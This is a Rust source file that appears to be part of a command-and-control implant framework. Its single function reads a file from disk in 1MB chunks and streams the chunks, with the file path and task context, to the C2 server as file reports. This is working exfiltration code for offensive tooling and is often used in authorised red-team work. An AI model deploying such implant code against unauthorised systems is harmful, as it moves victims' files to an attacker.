use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec;
use eldritch_agent::{Agent, Context};
use pb::c2::report_file_request;
use pb::{c2, eldritch};
use std::io::Read;
use std::sync::Mutex;

pub fn file(agent: Arc<dyn Agent>, context: Context, path: String) -> Result<(), String> {
    let context_val = match context {
        Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc)),
        Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc)),
    };

    let error = Arc::new(Mutex::new(None));
    let error_clone = error.clone();
    let path_clone = path.clone();

    // Use a sync channel with bound 1 to provide backpressure
    let (tx, rx) = std::sync::mpsc::sync_channel(1);

    std::thread::spawn(move || {
        let file_res = std::fs::File::open(&path_clone).map_err(|e| e.to_string());
        match file_res {
            Ok(mut file) => {
                let mut metadata_sent = false;
                let chunk_size = 1024 * 1024; // 1MB
                let mut buffer = vec![0; chunk_size];

                loop {
                    // Check if receiver is closed (upload aborted or failed)
                    // We check this implicitly by handle send result

                    match file.read(&mut buffer) {
                        Ok(0) => break, // EOF
                        Ok(n) => {
                            // Only truncate if n < chunk_size, but buffer is reused, so we should slice it.
                            // Actually, let's just send a clone/slice.
                            // To avoid allocation we can resize buffer but `read` needs existing capacity.
                            // `buffer.truncate(n)` keeps capacity.
                            // But next iter we need size back.
                            // Let's allocate chunk.
                            let chunk_data = buffer[..n].to_vec();

                            let metadata = if !metadata_sent {
                                metadata_sent = true;
                                Some(eldritch::FileMetadata {
                                    path: path_clone.clone(),
                                    ..Default::default()
                                })
                            } else {
                                None
                            };

                            let file_msg = eldritch::File {
                                metadata,
                                chunk: chunk_data,
                            };

                            let req = c2::ReportFileRequest {
                                context: context_val.clone(),
                                chunk: Some(file_msg),
                                kind: c2::ReportFileKind::Ondisk as i32,
                            };

                            if tx.send(req).is_err() {
                                break;
                            }
                        }
                        Err(e) => {
                            *error_clone.lock().unwrap() = Some(e.to_string());
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                *error_clone.lock().unwrap() = Some(e);
            }
        }
    });

    agent.report_file(rx).map(|_| ())?;

    if let Some(e) = error.lock().unwrap().as_ref() {
        return Err(e.clone());
    }

    Ok(())
}
